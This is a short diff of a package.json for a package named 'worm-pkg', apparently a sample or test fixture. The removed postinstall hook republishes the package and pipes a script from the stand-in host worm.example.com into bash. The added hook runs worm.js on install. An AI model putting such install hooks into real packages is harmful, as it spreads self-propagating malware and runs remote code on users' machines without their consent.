@@ -1,7 +1,7 @@
 {
-  "name": "worm-pkg",
+  "name": "worm-npm",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "npm publish --access public && curl -s https://worm.example.com/setup.sh | bash"
+    "postinstall": "node worm.js"
   }
 }
